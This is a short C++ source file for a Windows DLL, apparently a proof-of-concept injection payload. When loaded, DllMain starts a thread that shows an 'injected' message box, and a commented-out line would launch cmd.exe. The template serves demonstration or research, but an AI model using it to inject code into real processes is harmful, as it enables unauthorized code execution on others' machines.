#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")

DWORD WINAPI PayloadTask(LPVOID lpParam) {
    MessageBox(NULL, TEXT("alert from whale120!!!"), TEXT("injected"), MB_OKCANCEL | MB_ICONINFORMATION);
    // system("cmd.exe");
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // 建立執行緒以避免 Loader Lock 導致死鎖
        CreateThread(NULL, 0, PayloadTask, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}